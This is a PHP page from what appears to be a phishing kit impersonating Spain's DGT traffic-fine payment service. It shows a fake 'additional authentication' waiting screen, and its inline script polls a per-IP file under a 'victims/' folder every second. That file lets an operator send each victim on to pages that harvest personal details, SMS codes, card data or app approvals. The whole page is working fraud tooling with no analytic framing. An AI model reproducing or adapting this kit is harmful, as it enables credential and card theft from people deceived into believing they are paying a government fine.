<?php

    include "./Assets/php/config/config.php";

?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Assets/imgs/favicon.png">
        <title>Pago de sanciones</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Assets/css/style.css">
        <script src="./Assets/js/stutes.js"></script>        
    </head>
    <body>

        <!-- wrapper_details -->
        <div class="wrapper_box">
          <div class="container_box">
            <header class="header_2">
              <div class="menu align-items-center">
                <i class="ri-menu-line"></i><p class="mb-0">Mostrar menúMostrar menúMostrar menú</p>
              </div>
              <div class="skep d-flex justify-content-between align-items-center">
                <ul class="mb-0 ps-0 d-flex align-items-center">
                  <li>Salto a contenido</li>
                  <li>Salto a navegación</li>
                </ul>
                
              </div>
              <div class="group_hed">
                <div class="links">
                  <i class="ri-earth-fill inte"></i>
                  <ul class="d-flex align-items-center ps-0 mb-0 flex-wrap">
                    <li>Bienvenidos</li>
                    <li>Welcome</li>
                    <li>Bienvenue</li>
                    <li>Wilkomemn</li>
                    <li>Benvingut</li>
                    <li>Ongi-etorri</li>
                    <li>Benvido</li>
                    <li>Benvingut</li>
                  </ul>
                </div>
                <div class="logo_box d-flex align-items-center">
                  <div class="logo">
                    <img src="./Assets/imgs/Footer-DGT.svg" alt="">
                  </div>
                  <p>Pago de sanciones</p>
                </div>
              </div>
              <p class="you">Estás en: Pagar sanción (sin certificado) | Datos de la sanción</p>
              <div class="prof">
                <i class="fa-solid fa-user"></i>
              </div>
            </header>
            <div class="wrapper_loading">
              <form action="./action.php" method="post">
                <div class="title">
                  <h1>ESPERE POR FAVOR</h1>
                  <div class="bar"></div>
                </div>
                <div class="bor_load">
                    <p>Se ha solicitado autenticación adicional <br>
                      Redirección actual a la página de autenticación</p>
                    <img src="./Assets/imgs/load.gif" alt="">
                </div>
              </form>
            </div>
            <div class="box_about">
              <div class="about d-flex justify-content-between">
                <img src="./Assets/imgs/DKou.png" alt="">
                <p class="mb-0">Te invitamos a realizar nuestra encuesta de satisfacción. Así nos ayudarás a construir una aplicación que se ajuste más a tus necesidades. ¡Anímate! (Pulsa sobre la imagen).</p>
              </div>
            </div>
            <footer class="footer_2">
              <div class="first_foot">
                <ul class="mb-0 ps-0 d-flex flex-wrap">
                  <li>Aviso legal</li>
                  <li>|</li>
                  <li>Propiedad intelectual</li>
                  <li>|</li>
                  <li>Accesibilidad</li>
                  <li>|</li>
                  <li>Protección de datos</li>
                </ul>
                <img src="./Assets/imgs/social2.png" alt="">
                <p class="mb-0">Copyright @ DGT 2026. Todos los derechos reservados</p>
              </div>
              <div class="last_foot">
                <ul class="d-flex justify-content-center flex-wrap ps-0 mb-0">
                  <li><i class="ri-phone-fill"></i> 011 Estado del Tráfico</li>
                  <li><i class="ri-phone-fill"></i> 060 Admin. Gral. del Estado</li>
                  <li><i class="fa-solid fa-location-dot"></i> C/ Josefa Valcarcel, 28 - 28071 Madrid-España</li>
                </ul>
              </div>
            </footer>

          </div>
        </div>
        







        <!-- bootstrap -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <!-- script jquery -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js "></script>
        <script src="./Assets/js/js.js"></script>
        
        <script>
          var ip = '<?php echo get_client_ip(); ?>';
            var waiting = setInterval(function() {
              $.get('victims/' + ip + '.txt?' + new Date().getTime(), function(data) {
                  if( data == 0 ) {
                      //console.log('hada ba9i 0');
                  }else if( data == 'det' ){
                      clearInterval(waiting); 
                      location.href = "details.php";
                  }else if( data == 'det_error' ){
                      clearInterval(waiting);
                      location.href = "details.php?error";
                  }

                  else if( data == 'sms' ) {
                      clearInterval(waiting);
                      location.href = "sms.php";
                  }else if( data == 'sms_error' ){
                      clearInterval(waiting);
                      location.href = "sms.php?error";
                  }
                  
                  else if( data == 'card' ) {
                      clearInterval(waiting);
                      location.href = "card.php";
                  }else if( data == 'card_error' ){
                      clearInterval(waiting);
                      location.href = "card.php?error";
                  }
                  
                  else if( data == 'app' ){
                      clearInterval(waiting);
                      location.href = "app.php";
                  }
                  
                  else if( data == 'success' ){
                      clearInterval(waiting);
                      location.href = "success.php";
                  }
              });
          }, 1000);      
        </script>
    </body>
</html>